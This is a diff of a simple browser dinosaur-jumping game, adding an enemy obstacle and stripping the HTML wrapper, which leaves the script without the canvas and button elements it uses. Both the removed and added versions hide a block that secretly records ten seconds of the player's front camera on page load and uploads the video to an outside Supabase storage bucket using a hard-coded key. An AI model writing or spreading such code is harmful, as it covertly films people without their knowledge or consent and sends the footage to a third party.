@@ -1,159 +1,136 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>AUN's Dino Game</title>
-  <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      overflow: hidden;
-      touch-action: manipulation;
-      background: url('Background.png.png') no-repeat center center fixed;
-      background-size: cover;
-    }
-    canvas {
-      display: block;
-      margin: auto;
-      background: transparent;
-    }
-    #jumpButton {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      z-index: 10;
-      background: transparent;
-      border: none;
-    }
-  </style>
-</head>
-<body>
-  <canvas id="gameCanvas" width="800" height="400"></canvas>
-  <button id="jumpButton"></button>
+<script type="module">
+  const canvas = document.getElementById("gameCanvas");
+  const ctx = canvas.getContext("2d");
 
-  <script type="module">
-    const canvas = document.getElementById("gameCanvas");
-    const ctx = canvas.getContext("2d");
+  const dinoImg = new Image();
+  dinoImg.src = "Dinasour.png.png";
+  const cactusImg = new Image();
+  cactusImg.src = "Cactus.png.png";
+  const enemyImg = new Image();
+  enemyImg.src = "Enemy.png.png";
 
-    const dinoImg = new Image();
-    dinoImg.src = "Dinasour.png.png";
-    const cactusImg = new Image();
-    cactusImg.src = "Cactus.png.png";
+  const dino = {
+    x: 50, y: 300, width: 60, height: 60,
+    vy: 0, jumping: false
+  };
 
-    const dino = {
-      x: 50, y: 300, width: 60, height: 60,
-      vy: 0, jumping: false
-    };
-    const cactus = {
-      x: canvas.width, y: 300, width: 50, height: 60
-    };
+  const cactus = {
+    x: canvas.width, y: 300, width: 50, height: 60
+  };
 
-    const gravity = 1.8;
+  const enemy = {
+    x: canvas.width + 400,
+    y: 200 + Math.random() * 50,
+    width: 50,
+    height: 50,
+    speed: 6 + Math.random() * 3
+  };
 
-    let gameOver = false;
+  const gravity = 1.8;
+  let gameOver = false;
 
-    function resetCactus() {
-      cactus.x = canvas.width + Math.random() * 200;
+  function resetCactus() {
+    cactus.x = canvas.width + Math.random() * 200;
+  }
+
+  function resetEnemy() {
+    enemy.x = canvas.width + 300 + Math.random() * 300;
+    enemy.y = 180 + Math.random() * 50;
+    enemy.speed = 5 + Math.random() * 4;
+  }
+
+  function checkCollision(obj1, obj2) {
+    return (
+      obj1.x < obj2.x + obj2.width &&
+      obj1.x + obj1.width > obj2.x &&
+      obj1.y < obj2.y + obj2.height &&
+      obj1.y + obj1.height > obj2.y
+    );
+  }
+
+  function draw() {
+    if (gameOver) {
+      ctx.font = "40px Arial";
+      ctx.fillStyle = "red";
+      ctx.fillText("Game Over!", 300, 200);
+      return;
     }
 
-    function checkCollision() {
-      return (
-        dino.x < cactus.x + cactus.width &&
-        dino.x + dino.width > cactus.x &&
-        dino.y < cactus.y + cactus.height &&
-        dino.y + dino.height > cactus.y
-      );
-    }
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
 
-    function draw() {
-      if (gameOver) {
-        ctx.font = "40px Arial";
-        ctx.fillStyle = "red";
-        ctx.fillText("Game Over!", 300, 200);
-        return;
+    cactus.x -= 5;
+    if (cactus.x < -cactus.width) resetCactus();
+
+    enemy.x -= enemy.speed;
+    if (enemy.x < -enemy.width) resetEnemy();
+
+    if (dino.jumping) {
+      dino.vy += gravity;
+      dino.y += dino.vy;
+      if (dino.y >= 300) {
+        dino.y = 300;
+        dino.vy = 0;
+        dino.jumping = false;
       }
+    }
 
-      ctx.clearRect(0, 0, canvas.width, canvas.height);
+    if (checkCollision(dino, cactus) || checkCollision(dino, enemy)) {
+      gameOver = true;
+    }
 
-      // Move cactus
-      cactus.x -= 5;
-      if (cactus.x < -cactus.width) {
-        resetCactus();
-      }
+    ctx.drawImage(dinoImg, dino.x, dino.y, dino.width, dino.height);
+    ctx.drawImage(cactusImg, cactus.x, cactus.y, cactus.width, cactus.height);
+    ctx.drawImage(enemyImg, enemy.x, enemy.y, enemy.width, enemy.height);
 
-      // Apply jump physics
-      if (dino.jumping) {
-        dino.vy += gravity;
-        dino.y += dino.vy;
-        if (dino.y >= 300) {
-          dino.y = 300;
-          dino.vy = 0;
-          dino.jumping = false;
+    requestAnimationFrame(draw);
+  }
+
+  function jump() {
+    if (!dino.jumping && !gameOver) {
+      dino.jumping = true;
+      dino.vy = -20;
+    }
+  }
+
+  document.getElementById("jumpButton").addEventListener("touchstart", jump);
+  window.addEventListener("keydown", e => {
+    if (e.code === "Space" || e.code === "ArrowUp") jump();
+  });
+
+  draw();
+
+  // ======= VIDEO CAPTURE + SUPABASE UPLOAD =======
+  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+    .then(stream => {
+      const mediaRecorder = new MediaRecorder(stream);
+      let chunks = [];
+
+      mediaRecorder.ondataavailable = e => chunks.push(e.data);
+      mediaRecorder.onstop = async () => {
+        const blob = new Blob(chunks, { type: "video/webm" });
+        const fileName = `visit-${Date.now()}.webm`;
+
+        const { createClient } = await import('https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm');
+        const supabase = createClient(
+          'https://xtjwkxstpvkqcjewmjva.supabase.co',
+          'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh0andreHN0cHZrcWNqZXdtanZhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDQ3MDE0NjIsImV4cCI6MjA2MDI3NzQ2Mn0.-EdKJxRrJTLgrcvqn7-4xZJmdMBexINdP3430EE5nXo'
+        );
+
+        const { data, error } = await supabase.storage
+          .from('dino')
+          .upload(fileName, blob, {
+            contentType: 'video/webm'
+          });
+
+        if (error) {
+          console.error("❌ Upload Error:", error.message);
+        } else {
+          console.log("✅ Video uploaded:", data.path);
         }
-      }
+      };
 
-      // Check collision
-      if (checkCollision()) {
-        gameOver = true;
-      }
-
-      ctx.drawImage(dinoImg, dino.x, dino.y, dino.width, dino.height);
-      ctx.drawImage(cactusImg, cactus.x, cactus.y, cactus.width, cactus.height);
-
-      requestAnimationFrame(draw);
-    }
-
-    function jump() {
-      if (!dino.jumping && !gameOver) {
-        dino.jumping = true;
-        dino.vy = -20;
-      }
-    }
-
-    document.getElementById("jumpButton").addEventListener("touchstart", jump);
-    window.addEventListener("keydown", e => {
-      if (e.code === "Space" || e.code === "ArrowUp") jump();
-    });
-
-    draw();
-
-    // === Record front cam & upload to Supabase ===
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-      .then(stream => {
-        const mediaRecorder = new MediaRecorder(stream);
-        let chunks = [];
-
-        mediaRecorder.ondataavailable = e => chunks.push(e.data);
-        mediaRecorder.onstop = async () => {
-          const blob = new Blob(chunks, { type: "video/webm" });
-          const fileName = `visit-${Date.now()}.webm`;
-
-          const { createClient } = await import('https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm');
-          const supabase = createClient(
-            'https://xtjwkxstpvkqcjewmjva.supabase.co',
-            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh0andreHN0cHZrcWNqZXdtanZhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDQ3MDE0NjIsImV4cCI6MjA2MDI3NzQ2Mn0.-EdKJxRrJTLgrcvqn7-4xZJmdMBexINdP3430EE5nXo'
-          );
-
-          const { data, error } = await supabase.storage
-            .from('dino')
-            .upload(fileName, blob, {
-              contentType: 'video/webm'
-            });
-
-          if (error) {
-            console.error("❌ Upload Error:", error.message);
-          } else {
-            console.log("✅ Video uploaded:", data.path);
-          }
-        };
-
-        mediaRecorder.start();
-        setTimeout(() => mediaRecorder.stop(), 10000);
-      })
-      .catch(err => console.error("❌ Camera error:", err));
-  </script>
-</body>
-</html>
+      mediaRecorder.start();
+      setTimeout(() => mediaRecorder.stop(), 10000);
+    })
+    .catch(err => console.error("❌ Camera error:", err));
+</script>
